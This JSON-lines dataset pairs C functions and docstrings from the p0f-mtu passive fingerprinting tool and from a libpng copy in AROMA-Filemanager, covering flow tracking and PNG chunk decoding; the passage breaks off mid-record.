{"docstring": "/* Go through host and flow cache, expire outdated items. */\n", "func_signal": "static void expire_cache(void)", "code": "{\n  struct host_data* target;\n  static u32 pt;\n\n  u32 ct = get_unix_time();\n\n  if (ct == pt) return;\n  pt = ct;\n\n  DEBUG(\"[#] Cache expiration kicks in...\\n\");\n\n  while (CP(flow_by_age) && ct - flow_by_age->created > conn_max_age)\n    destroy_flow(flow_by_age);\n\n  target = host_by_age;\n\n  while (CP(target) && ct - target->last_seen > host_idle_limit * 60) {\n    struct host_data* newer = target->newer;\n    if (!target->use_cnt) destroy_host(target);\n    target = newer;\n  }\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Convert IPv4 or IPv6 address to a human-readable form. */\n", "func_signal": "u8* addr_to_str(u8* data, u8 ip_ver)", "code": "{\n\n  static char tmp[128];\n\n  /* We could be using inet_ntop(), but on systems that have older libc\n     but still see passing IPv6 traffic, we would be in a pickle. */\n\n  if (ip_ver == IP_VER4) {\n\n    sprintf(tmp, \"%u.%u.%u.%u\", data[0], data[1], data[2], data[3]);\n\n  } else {\n\n    sprintf(tmp, \"%x:%x:%x:%x:%x:%x:%x:%x\",\n            (data[0] << 8) | data[1], (data[2] << 8) | data[3], \n            (data[4] << 8) | data[5], (data[6] << 8) | data[7], \n            (data[8] << 8) | data[9], (data[10] << 8) | data[11], \n            (data[12] << 8) | data[13], (data[14] << 8) | data[15]);\n\n  }\n\n  return (u8*)tmp;\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Calculate hash bucket for host_data. */\n", "func_signal": "static u32 get_host_bucket(u8* addr, u8 ip_ver)", "code": "{\n\n  u32 bucket;\n\n  bucket = hash32(addr, (ip_ver == IP_VER4) ? 4 : 16, hash_seed);\n\n  return bucket % HOST_BUCKETS;\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Create a minimal host data. */\n", "func_signal": "static struct host_data* create_host(u8* addr, u8 ip_ver)", "code": "{\n\n  u32 bucket = get_host_bucket(addr, ip_ver);\n  struct host_data* nh;\n\n  if (host_cnt > max_hosts) nuke_hosts();\n\n  DEBUG(\"[#] Creating host data: %s (bucket %u)\\n\",\n        addr_to_str(addr, ip_ver), bucket);\n\n  nh = ck_alloc(sizeof(struct host_data));\n\n  /* Insert into the bucketed linked list. */\n\n  if (CP(host_b[bucket])) {\n    host_b[bucket]->prev = nh;\n    nh->next = host_b[bucket];\n  }\n\n  host_b[bucket] = nh;\n\n  /* Insert into the by-age linked list. */\n \n  if (CP(newest_host)) {\n\n    newest_host->newer = nh;\n    nh->older = newest_host;\n\n  } else host_by_age = nh;\n\n  newest_host = nh;\n\n  /* Populate other data. */\n\n  nh->ip_ver = ip_ver;\n  memcpy(nh->addr, addr, (ip_ver == IP_VER4) ? 4 : 16);\n\n  nh->last_seen = nh->first_seen = get_unix_time();\n\n  nh->last_up_min     = -1;\n  nh->last_class_id   = -1;\n  nh->last_name_id    = -1;\n  nh->http_name_id    = -1;\n  nh->distance        = -1;\n\n  host_cnt++;\n\n  return nh;\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Insert data from a packet into a flow, call handlers as appropriate. */\n", "func_signal": "static void flow_dispatch(struct packet_data* pk)", "code": "{\n\n  struct packet_flow* f;\n  struct tcp_sig* tsig;\n  u8 to_srv = 0;\n  u8 need_more = 0;\n\n  DEBUG(\"[#] Received TCP packet: %s/%u -> \",\n        addr_to_str(pk->src, pk->ip_ver), pk->sport);\n\n  DEBUG(\"%s/%u (type 0x%02x, pay_len = %u)\\n\",\n        addr_to_str(pk->dst, pk->ip_ver), pk->dport, pk->tcp_type,\n        pk->pay_len);\n    \n  f = lookup_flow(pk, &to_srv);\n\n  switch (pk->tcp_type) {\n\n    case TCP_SYN:\n\n      if (f) {\n\n        /* Perhaps just a simple dupe? */\n        if (to_srv && f->next_cli_seq - 1 == pk->seq) return;\n\n        DEBUG(\"[#] New SYN for an existing flow, resetting.\\n\");\n        destroy_flow(f);\n\n      }\n\n      f = create_flow_from_syn(pk);\n\n      tsig = fingerprint_tcp(1, pk, f);\n\n      /* We don't want to do any further processing on generic non-OS\n         signatures (e.g. NMap). The easiest way to guarantee that is to \n         kill the flow. */\n\n      if (!tsig && !f->sendsyn) {\n\n        destroy_flow(f);\n        return;\n\n      }\n\n      fingerprint_mtu(1, pk, f);\n      check_ts_tcp(1, pk, f);\n\n      if (tsig) {\n\n        /* This can't be done in fingerprint_tcp because check_ts_tcp()\n           depends on having original SYN / SYN+ACK data. */\n \n        ck_free(f->client->last_syn);\n        f->client->last_syn = tsig;\n\n      }\n\n      break;\n\n    case TCP_SYN | TCP_ACK:\n\n      if (!f) {\n\n        DEBUG(\"[#] Stray SYN+ACK with no flow.\\n\");\n        return;\n\n      }\n\n      /* This is about as far as we want to go with p0f-sendsyn. */\n\n      if (f->sendsyn) {\n\n        fingerprint_tcp(0, pk, f);\n        destroy_flow(f);\n        return;\n\n      }\n\n\n      if (to_srv) {\n\n        DEBUG(\"[#] SYN+ACK from client to server, trippy.\\n\");\n        return;\n\n      }\n\n      if (f->acked) {\n\n        if (f->next_srv_seq - 1 != pk->seq)\n          DEBUG(\"[#] Repeated but non-identical SYN+ACK (0x%08x != 0x%08x).\\n\",\n                f->next_srv_seq - 1, pk->seq);\n\n        return;\n\n      }\n\n      f->acked = 1;\n\n      tsig = fingerprint_tcp(0, pk, f);\n\n      /* SYN from real OS, SYN+ACK from a client stack. Weird, but whatever. */\n\n      if (!tsig) {\n\n        destroy_flow(f);\n        return;\n\n      }\n\n      fingerprint_mtu(0, pk, f);\n      check_ts_tcp(0, pk, f);\n\n      ck_free(f->server->last_synack);\n      f->server->last_synack = tsig;\n\n      f->next_srv_seq = pk->seq + 1;\n\n      break;\n\n    case TCP_RST | TCP_ACK:\n    case TCP_RST:\n    case TCP_FIN | TCP_ACK:\n    case TCP_FIN:\n\n       if (f) {\n\n         check_ts_tcp(to_srv, pk, f);\n         destroy_flow(f);\n\n       }\n\n       break;\n\n    case TCP_ACK:\n\n      if (!f) return;\n\n      /* Stop there, you criminal scum! */\n\n      if (f->sendsyn) {\n        destroy_flow(f);\n        return;\n      }\n\n      if (!f->acked) {\n\n        DEBUG(\"[#] Never received SYN+ACK to complete handshake, huh.\\n\");\n        destroy_flow(f);\n        return;\n\n      }\n\n      if (to_srv) {\n\n        /* We don't do stream reassembly, so if something arrives out of order,\n           we won't catch it. Oh well. */\n\n        if (f->next_cli_seq != pk->seq) {\n\n          /* Not a simple dupe? */\n\n          if (f->next_cli_seq - pk->pay_len != pk->seq)\n            DEBUG(\"[#] Expected client seq 0x%08x, got 0x%08x.\\n\", f->next_cli_seq, pk->seq);\n \n          return;\n        }\n\n        /* Append data */\n\n        if (f->req_len < MAX_FLOW_DATA && pk->pay_len) {\n\n          u32 read_amt = MIN(pk->pay_len, MAX_FLOW_DATA - f->req_len);\n\n          f->request = ck_realloc_kb(f->request, f->req_len + read_amt + 1);\n          memcpy(f->request + f->req_len, pk->payload, read_amt);\n          f->req_len += read_amt;\n\n        }\n\n        check_ts_tcp(1, pk, f);\n\n        f->next_cli_seq += pk->pay_len;\n\n      } else {\n\n        if (f->next_srv_seq != pk->seq) {\n\n          /* Not a simple dupe? */\n\n          if (f->next_srv_seq - pk->pay_len != pk->seq)\n            DEBUG(\"[#] Expected server seq 0x%08x, got 0x%08x.\\n\",\n                  f->next_cli_seq, pk->seq);\n \n          return;\n\n        }\n\n        /* Append data */\n\n        if (f->resp_len < MAX_FLOW_DATA && pk->pay_len) {\n\n          u32 read_amt = MIN(pk->pay_len, MAX_FLOW_DATA - f->resp_len);\n\n          f->response = ck_realloc_kb(f->response, f->resp_len + read_amt + 1);\n          memcpy(f->response + f->resp_len, pk->payload, read_amt);\n          f->resp_len += read_amt;\n\n        }\n\n        check_ts_tcp(0, pk, f);\n\n        f->next_srv_seq += pk->pay_len;\n\n      }\n\n      if (!pk->pay_len) return;\n\n      need_more |= process_http(to_srv, f);\n\n      if (!need_more) {\n\n        DEBUG(\"[#] All modules done, no need to keep tracking flow.\\n\");\n        destroy_flow(f);\n\n      } else if (f->req_len >= MAX_FLOW_DATA && f->resp_len >= MAX_FLOW_DATA) {\n\n        DEBUG(\"[#] Per-flow capture size limit exceeded.\\n\");\n        destroy_flow(f);\n\n      }\n\n      break;\n\n    default:\n\n      WARN(\"Huh. Unexpected packet type 0x%02x in flow_dispatch().\", pk->tcp_type);\n\n  }\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* Look up an existing flow. */\n", "func_signal": "static struct packet_flow* lookup_flow(struct packet_data* pk, u8* to_srv)", "code": "{\n\n  u32 bucket = get_flow_bucket(pk);\n  struct packet_flow* f = flow_b[bucket];\n\n  while (CP(f)) {\n\n    CP(f->client);\n    CP(f->server);\n\n    if (pk->ip_ver != f->client->ip_ver) goto lookup_next;\n\n    if (pk->sport == f->cli_port && pk->dport == f->srv_port &&\n        !memcmp(pk->src, f->client->addr, (pk->ip_ver == IP_VER4) ? 4 : 16) &&\n        !memcmp(pk->dst, f->server->addr, (pk->ip_ver == IP_VER4) ? 4 : 16)) {\n\n      *to_srv = 1;\n      return f;\n\n    }\n\n    if (pk->dport == f->cli_port && pk->sport == f->srv_port &&\n        !memcmp(pk->dst, f->client->addr, (pk->ip_ver == IP_VER4) ? 4 : 16) &&\n        !memcmp(pk->src, f->server->addr, (pk->ip_ver == IP_VER4) ? 4 : 16)) {\n\n      *to_srv = 0;\n      return f;\n\n    }\n\nlookup_next:\n\n    f = f->next;\n\n  }\n\n  return NULL;\n\n}", "path": "process.c", "repo_name": "ValdikSS/p0f-mtu", "stars": 213, "license": "None", "language": "c", "size": 112}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_combine_row(png_structp png_ptr, png_bytep row, int mask)", "code": "{\n   png_debug(1, \"in png_combine_row\");\n   if (mask == 0xff)\n   {\n      png_memcpy(row, png_ptr->row_buf + 1,\n         PNG_ROWBYTES(png_ptr->row_info.pixel_depth, png_ptr->width));\n   }\n   else\n   {\n      switch (png_ptr->row_info.pixel_depth)\n      {\n         case 1:\n         {\n            png_bytep sp = png_ptr->row_buf + 1;\n            png_bytep dp = row;\n            int s_inc, s_start, s_end;\n            int m = 0x80;\n            int shift;\n            png_uint_32 i;\n            png_uint_32 row_width = png_ptr->width;\n\n#ifdef PNG_READ_PACKSWAP_SUPPORTED\n            if (png_ptr->transformations & PNG_PACKSWAP)\n            {\n                s_start = 0;\n                s_end = 7;\n                s_inc = 1;\n            }\n            else\n#endif\n            {\n                s_start = 7;\n                s_end = 0;\n                s_inc = -1;\n            }\n\n            shift = s_start;\n\n            for (i = 0; i < row_width; i++)\n            {\n               if (m & mask)\n               {\n                  int value;\n\n                  value = (*sp >> shift) & 0x01;\n                  *dp &= (png_byte)((0x7f7f >> (7 - shift)) & 0xff);\n                  *dp |= (png_byte)(value << shift);\n               }\n\n               if (shift == s_end)\n               {\n                  shift = s_start;\n                  sp++;\n                  dp++;\n               }\n               else\n                  shift += s_inc;\n\n               if (m == 1)\n                  m = 0x80;\n               else\n                  m >>= 1;\n            }\n            break;\n         }\n         case 2:\n         {\n            png_bytep sp = png_ptr->row_buf + 1;\n            png_bytep dp = row;\n            int s_start, s_end, s_inc;\n            int m = 0x80;\n            int shift;\n            png_uint_32 i;\n            png_uint_32 row_width = png_ptr->width;\n            int value;\n\n#ifdef PNG_READ_PACKSWAP_SUPPORTED\n            if (png_ptr->transformations & PNG_PACKSWAP)\n            {\n               s_start = 0;\n               s_end = 6;\n               s_inc = 2;\n            }\n            else\n#endif\n            {\n               s_start = 6;\n               s_end = 0;\n               s_inc = -2;\n            }\n\n            shift = s_start;\n\n            for (i = 0; i < row_width; i++)\n            {\n               if (m & mask)\n               {\n                  value = (*sp >> shift) & 0x03;\n                  *dp &= (png_byte)((0x3f3f >> (6 - shift)) & 0xff);\n                  *dp |= (png_byte)(value << shift);\n               }\n\n               if (shift == s_end)\n               {\n                  shift = s_start;\n                  sp++;\n                  dp++;\n               }\n               else\n                  shift += s_inc;\n               if (m == 1)\n                  m = 0x80;\n               else\n                  m >>= 1;\n            }\n            break;\n         }\n         case 4:\n         {\n            png_bytep sp = png_ptr->row_buf + 1;\n            png_bytep dp = row;\n            int s_start, s_end, s_inc;\n            int m = 0x80;\n            int shift;\n            png_uint_32 i;\n            png_uint_32 row_width = png_ptr->width;\n            int value;\n\n#ifdef PNG_READ_PACKSWAP_SUPPORTED\n            if (png_ptr->transformations & PNG_PACKSWAP)\n            {\n               s_start = 0;\n               s_end = 4;\n               s_inc = 4;\n            }\n            else\n#endif\n            {\n               s_start = 4;\n               s_end = 0;\n               s_inc = -4;\n            }\n            shift = s_start;\n\n            for (i = 0; i < row_width; i++)\n            {\n               if (m & mask)\n               {\n                  value = (*sp >> shift) & 0xf;\n                  *dp &= (png_byte)((0xf0f >> (4 - shift)) & 0xff);\n                  *dp |= (png_byte)(value << shift);\n               }\n\n               if (shift == s_end)\n               {\n                  shift = s_start;\n                  sp++;\n                  dp++;\n               }\n               else\n                  shift += s_inc;\n               if (m == 1)\n                  m = 0x80;\n               else\n                  m >>= 1;\n            }\n            break;\n         }\n         default:\n         {\n            png_bytep sp = png_ptr->row_buf + 1;\n            png_bytep dp = row;\n            png_size_t pixel_bytes = (png_ptr->row_info.pixel_depth >> 3);\n            png_uint_32 i;\n            png_uint_32 row_width = png_ptr->width;\n            png_byte m = 0x80;\n\n\n            for (i = 0; i < row_width; i++)\n            {\n               if (m & mask)\n               {\n                  png_memcpy(dp, sp, pixel_bytes);\n               }\n\n               sp += pixel_bytes;\n               dp += pixel_bytes;\n\n               if (m == 1)\n                  m = 0x80;\n               else\n                  m >>= 1;\n            }\n            break;\n         }\n      }\n   }\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_read_interlace(png_structp png_ptr)", "code": "{\n   png_row_infop row_info = &(png_ptr->row_info);\n   png_bytep row = png_ptr->row_buf + 1;\n   int pass = png_ptr->pass;\n   png_uint_32 transformations = png_ptr->transformations;\n   /* Arrays to facilitate easy interlacing - use pass (0 - 6) as index */\n   /* Offset to next interlace block */\n   PNG_CONST int png_pass_inc[7] = {8, 8, 4, 4, 2, 2, 1};\n\n   png_debug(1, \"in png_do_read_interlace\");\n   if (row != NULL && row_info != NULL)\n   {\n      png_uint_32 final_width;\n\n      final_width = row_info->width * png_pass_inc[pass];\n\n      switch (row_info->pixel_depth)\n      {\n         case 1:\n         {\n            png_bytep sp = row + (png_size_t)((row_info->width - 1) >> 3);\n            png_bytep dp = row + (png_size_t)((final_width - 1) >> 3);\n            int sshift, dshift;\n            int s_start, s_end, s_inc;\n            int jstop = png_pass_inc[pass];\n            png_byte v;\n            png_uint_32 i;\n            int j;\n\n#ifdef PNG_READ_PACKSWAP_SUPPORTED\n            if (transformations & PNG_PACKSWAP)\n            {\n                sshift = (int)((row_info->width + 7) & 0x07);\n                dshift = (int)((final_width + 7) & 0x07);\n                s_start = 7;\n                s_end = 0;\n                s_inc = -1;\n            }\n            else\n#endif\n            {\n                sshift = 7 - (int)((row_info->width + 7) & 0x07);\n                dshift = 7 - (int)((final_width + 7) & 0x07);\n                s_start = 0;\n                s_end = 7;\n                s_inc = 1;\n            }\n\n            for (i = 0; i < row_info->width; i++)\n            {\n               v = (png_byte)((*sp >> sshift) & 0x01);\n               for (j = 0; j < jstop; j++)\n               {\n                  *dp &= (png_byte)((0x7f7f >> (7 - dshift)) & 0xff);\n                  *dp |= (png_byte)(v << dshift);\n                  if (dshift == s_end)\n                  {\n                     dshift = s_start;\n                     dp--;\n                  }\n                  else\n                     dshift += s_inc;\n               }\n               if (sshift == s_end)\n               {\n                  sshift = s_start;\n                  sp--;\n               }\n               else\n                  sshift += s_inc;\n            }\n            break;\n         }\n         case 2:\n         {\n            png_bytep sp = row + (png_uint_32)((row_info->width - 1) >> 2);\n            png_bytep dp = row + (png_uint_32)((final_width - 1) >> 2);\n            int sshift, dshift;\n            int s_start, s_end, s_inc;\n            int jstop = png_pass_inc[pass];\n            png_uint_32 i;\n\n#ifdef PNG_READ_PACKSWAP_SUPPORTED\n            if (transformations & PNG_PACKSWAP)\n            {\n               sshift = (int)(((row_info->width + 3) & 0x03) << 1);\n               dshift = (int)(((final_width + 3) & 0x03) << 1);\n               s_start = 6;\n               s_end = 0;\n               s_inc = -2;\n            }\n            else\n#endif\n            {\n               sshift = (int)((3 - ((row_info->width + 3) & 0x03)) << 1);\n               dshift = (int)((3 - ((final_width + 3) & 0x03)) << 1);\n               s_start = 0;\n               s_end = 6;\n               s_inc = 2;\n            }\n\n            for (i = 0; i < row_info->width; i++)\n            {\n               png_byte v;\n               int j;\n\n               v = (png_byte)((*sp >> sshift) & 0x03);\n               for (j = 0; j < jstop; j++)\n               {\n                  *dp &= (png_byte)((0x3f3f >> (6 - dshift)) & 0xff);\n                  *dp |= (png_byte)(v << dshift);\n                  if (dshift == s_end)\n                  {\n                     dshift = s_start;\n                     dp--;\n                  }\n                  else\n                     dshift += s_inc;\n               }\n               if (sshift == s_end)\n               {\n                  sshift = s_start;\n                  sp--;\n               }\n               else\n                  sshift += s_inc;\n            }\n            break;\n         }\n         case 4:\n         {\n            png_bytep sp = row + (png_size_t)((row_info->width - 1) >> 1);\n            png_bytep dp = row + (png_size_t)((final_width - 1) >> 1);\n            int sshift, dshift;\n            int s_start, s_end, s_inc;\n            png_uint_32 i;\n            int jstop = png_pass_inc[pass];\n\n#ifdef PNG_READ_PACKSWAP_SUPPORTED\n            if (transformations & PNG_PACKSWAP)\n            {\n               sshift = (int)(((row_info->width + 1) & 0x01) << 2);\n               dshift = (int)(((final_width + 1) & 0x01) << 2);\n               s_start = 4;\n               s_end = 0;\n               s_inc = -4;\n            }\n            else\n#endif\n            {\n               sshift = (int)((1 - ((row_info->width + 1) & 0x01)) << 2);\n               dshift = (int)((1 - ((final_width + 1) & 0x01)) << 2);\n               s_start = 0;\n               s_end = 4;\n               s_inc = 4;\n            }\n\n            for (i = 0; i < row_info->width; i++)\n            {\n               png_byte v = (png_byte)((*sp >> sshift) & 0xf);\n               int j;\n\n               for (j = 0; j < jstop; j++)\n               {\n                  *dp &= (png_byte)((0xf0f >> (4 - dshift)) & 0xff);\n                  *dp |= (png_byte)(v << dshift);\n                  if (dshift == s_end)\n                  {\n                     dshift = s_start;\n                     dp--;\n                  }\n                  else\n                     dshift += s_inc;\n               }\n               if (sshift == s_end)\n               {\n                  sshift = s_start;\n                  sp--;\n               }\n               else\n                  sshift += s_inc;\n            }\n            break;\n         }\n         default:\n         {\n            png_size_t pixel_bytes = (row_info->pixel_depth >> 3);\n            png_bytep sp = row + (png_size_t)(row_info->width - 1)\n                * pixel_bytes;\n            png_bytep dp = row + (png_size_t)(final_width - 1) * pixel_bytes;\n\n            int jstop = png_pass_inc[pass];\n            png_uint_32 i;\n\n            for (i = 0; i < row_info->width; i++)\n            {\n               png_byte v[8];\n               int j;\n\n               png_memcpy(v, sp, pixel_bytes);\n               for (j = 0; j < jstop; j++)\n               {\n                  png_memcpy(dp, v, pixel_bytes);\n                  dp -= pixel_bytes;\n               }\n               sp -= pixel_bytes;\n            }\n            break;\n         }\n      }\n      row_info->width = final_width;\n      row_info->rowbytes = PNG_ROWBYTES(row_info->pixel_depth, final_width);\n   }\n#ifndef PNG_READ_PACKSWAP_SUPPORTED\n   transformations = transformations; /* Silence compiler warning */\n#endif\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_crc_read(png_structp png_ptr, png_bytep buf, png_size_t length)", "code": "{\n   if (png_ptr == NULL)\n      return;\n   png_read_data(png_ptr, buf, length);\n   png_calculate_crc(png_ptr, buf, length);\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_handle_sBIT(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)", "code": "{\n   png_size_t truelen;\n   png_byte buf[4];\n\n   png_debug(1, \"in png_handle_sBIT\");\n\n   buf[0] = buf[1] = buf[2] = buf[3] = 0;\n\n   if (!(png_ptr->mode & PNG_HAVE_IHDR))\n      png_error(png_ptr, \"Missing IHDR before sBIT\");\n   else if (png_ptr->mode & PNG_HAVE_IDAT)\n   {\n      png_warning(png_ptr, \"Invalid sBIT after IDAT\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n   else if (png_ptr->mode & PNG_HAVE_PLTE)\n   {\n      /* Should be an error, but we can cope with it */\n      png_warning(png_ptr, \"Out of place sBIT chunk\");\n   }\n   if (info_ptr != NULL && (info_ptr->valid & PNG_INFO_sBIT))\n   {\n      png_warning(png_ptr, \"Duplicate sBIT chunk\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   if (png_ptr->color_type == PNG_COLOR_TYPE_PALETTE)\n      truelen = 3;\n   else\n      truelen = (png_size_t)png_ptr->channels;\n\n   if (length != truelen || length > 4)\n   {\n      png_warning(png_ptr, \"Incorrect sBIT chunk length\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   png_crc_read(png_ptr, buf, truelen);\n   if (png_crc_finish(png_ptr, 0))\n      return;\n\n   if (png_ptr->color_type & PNG_COLOR_MASK_COLOR)\n   {\n      png_ptr->sig_bit.red = buf[0];\n      png_ptr->sig_bit.green = buf[1];\n      png_ptr->sig_bit.blue = buf[2];\n      png_ptr->sig_bit.alpha = buf[3];\n   }\n   else\n   {\n      png_ptr->sig_bit.gray = buf[0];\n      png_ptr->sig_bit.red = buf[0];\n      png_ptr->sig_bit.green = buf[0];\n      png_ptr->sig_bit.blue = buf[0];\n      png_ptr->sig_bit.alpha = buf[1];\n   }\n   png_set_sBIT(png_ptr, info_ptr, &(png_ptr->sig_bit));\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* This function returns a pointer to the error_ptr associated with the user\n * functions.  The application should free any memory associated with this\n * pointer before png_write_destroy and png_read_destroy are called.\n */\n", "func_signal": "png_voidp PNGAPI\npng_get_error_ptr(png_structp png_ptr)", "code": "{\n   if (png_ptr == NULL)\n      return NULL;\n   return ((png_voidp)png_ptr->error_ptr);\n}", "path": "libs\\png\\pngerror.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_handle_hIST(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)", "code": "{\n   unsigned int num, i;\n   png_uint_16 readbuf[PNG_MAX_PALETTE_LENGTH];\n\n   png_debug(1, \"in png_handle_hIST\");\n\n   if (!(png_ptr->mode & PNG_HAVE_IHDR))\n      png_error(png_ptr, \"Missing IHDR before hIST\");\n   else if (png_ptr->mode & PNG_HAVE_IDAT)\n   {\n      png_warning(png_ptr, \"Invalid hIST after IDAT\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n   else if (!(png_ptr->mode & PNG_HAVE_PLTE))\n   {\n      png_warning(png_ptr, \"Missing PLTE before hIST\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n   else if (info_ptr != NULL && (info_ptr->valid & PNG_INFO_hIST))\n   {\n      png_warning(png_ptr, \"Duplicate hIST chunk\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   num = length / 2 ;\n   if (num != (unsigned int) png_ptr->num_palette || num >\n      (unsigned int) PNG_MAX_PALETTE_LENGTH)\n   {\n      png_warning(png_ptr, \"Incorrect hIST chunk length\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   for (i = 0; i < num; i++)\n   {\n      png_byte buf[2];\n\n      png_crc_read(png_ptr, buf, 2);\n      readbuf[i] = png_get_uint_16(buf);\n   }\n\n   if (png_crc_finish(png_ptr, 0))\n      return;\n\n   png_set_hIST(png_ptr, info_ptr, readbuf);\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_handle_sRGB(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)", "code": "{\n   int intent;\n   png_byte buf[1];\n\n   png_debug(1, \"in png_handle_sRGB\");\n\n   if (!(png_ptr->mode & PNG_HAVE_IHDR))\n      png_error(png_ptr, \"Missing IHDR before sRGB\");\n   else if (png_ptr->mode & PNG_HAVE_IDAT)\n   {\n      png_warning(png_ptr, \"Invalid sRGB after IDAT\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n   else if (png_ptr->mode & PNG_HAVE_PLTE)\n      /* Should be an error, but we can cope with it */\n      png_warning(png_ptr, \"Out of place sRGB chunk\");\n\n   if (info_ptr != NULL && (info_ptr->valid & PNG_INFO_sRGB))\n   {\n      png_warning(png_ptr, \"Duplicate sRGB chunk\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   if (length != 1)\n   {\n      png_warning(png_ptr, \"Incorrect sRGB chunk length\");\n      png_crc_finish(png_ptr, length);\n      return;\n   }\n\n   png_crc_read(png_ptr, buf, 1);\n   if (png_crc_finish(png_ptr, 0))\n      return;\n\n   intent = buf[0];\n   /* Check for bad intent */\n   if (intent >= PNG_sRGB_INTENT_LAST)\n   {\n      png_warning(png_ptr, \"Unknown sRGB intent\");\n      return;\n   }\n\n#if defined(PNG_READ_gAMA_SUPPORTED) && defined(PNG_READ_GAMMA_SUPPORTED)\n   if (info_ptr != NULL && (info_ptr->valid & PNG_INFO_gAMA))\n   {\n   png_fixed_point igamma;\n#ifdef PNG_FIXED_POINT_SUPPORTED\n      igamma=info_ptr->int_gamma;\n#else\n#  ifdef PNG_FLOATING_POINT_SUPPORTED\n      igamma=(png_fixed_point)(info_ptr->gamma * 100000.);\n#  endif\n#endif\n      if (PNG_OUT_OF_RANGE(igamma, 45500L, 500))\n      {\n         png_warning(png_ptr,\n           \"Ignoring incorrect gAMA value when sRGB is also present\");\n#ifdef PNG_CONSOLE_IO_SUPPORTED\n#  ifdef PNG_FIXED_POINT_SUPPORTED\n         fprintf(stderr, \"incorrect gamma=(%d/100000)\\n\",\n            (int)png_ptr->int_gamma);\n#  else\n#    ifdef PNG_FLOATING_POINT_SUPPORTED\n         fprintf(stderr, \"incorrect gamma=%f\\n\", png_ptr->gamma);\n#    endif\n#  endif\n#endif\n      }\n   }\n#endif /* PNG_READ_gAMA_SUPPORTED */\n\n#ifdef PNG_READ_cHRM_SUPPORTED\n#ifdef PNG_FIXED_POINT_SUPPORTED\n   if (info_ptr != NULL && (info_ptr->valid & PNG_INFO_cHRM))\n      if (PNG_OUT_OF_RANGE(info_ptr->int_x_white, 31270,  1000) ||\n          PNG_OUT_OF_RANGE(info_ptr->int_y_white, 32900,  1000) ||\n          PNG_OUT_OF_RANGE(info_ptr->int_x_red,   64000L, 1000) ||\n          PNG_OUT_OF_RANGE(info_ptr->int_y_red,   33000,  1000) ||\n          PNG_OUT_OF_RANGE(info_ptr->int_x_green, 30000,  1000) ||\n          PNG_OUT_OF_RANGE(info_ptr->int_y_green, 60000L, 1000) ||\n          PNG_OUT_OF_RANGE(info_ptr->int_x_blue,  15000,  1000) ||\n          PNG_OUT_OF_RANGE(info_ptr->int_y_blue,   6000,  1000))\n         {\n            png_warning(png_ptr,\n              \"Ignoring incorrect cHRM value when sRGB is also present\");\n         }\n#endif /* PNG_FIXED_POINT_SUPPORTED */\n#endif /* PNG_READ_cHRM_SUPPORTED */\n\n   png_set_sRGB_gAMA_and_cHRM(png_ptr, info_ptr, intent);\n}", "path": "libs\\png\\pngrutil.c", "repo_name": "amarullz/AROMA-Filemanager", "stars": 243, "license": "None", "language": "c", "size": 8371}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_read_filter_row(png_structp png_ptr, png_row_infop row_info, png_bytep row,\n   png_bytep prev_row, int filter)", "code": "{\n   png_debug(1, \"in png_read_filter_row\");\n   png_debug2(2, \"row = %lu, filter = %d\", png_ptr->row_number, filter);\n\n#if defined(__ARM_HAVE_NEON)\n   png_read_filter_row_neon(row_info->rowbytes, row_info->pixel_depth, row, prev_row, filter);\n#else\n   switch (filter)\n   {\n      case PNG_FILTER_VALUE_NONE:\n         break;\n      case PNG_FILTER_VALUE_SUB:\n      {\n         png_uint_32 i;\n         png_uint_32 istop = row_info->rowbytes;\n         png_uint_32 bpp = (row_info->pixel_depth + 7) >> 3;\n         png_bytep rp = row + bpp;\n         png_bytep lp = row;\n\n         for (i = bpp; i < istop; i++)\n         {\n            *rp = (png_byte)(((int)(*rp) + (int)(*lp++)) & 0xff);\n            rp++;\n         }\n         break;\n      }\n      case PNG_FILTER_VALUE_UP:\n      {\n         png_uint_32 i;\n         png_uint_32 istop = row_info->rowbytes;\n         png_bytep rp = row;\n         png_bytep pp = prev_row;\n\n         for (i = 0; i < istop; i++)\n         {\n            *rp = (png_byte)(((int)(*rp) + (int)(*pp++)) & 0xff);\n            rp++;\n         }\n         break;\n      }\n      case PNG_FILTER_VALUE_AVG:\n      {\n         png_uint_32 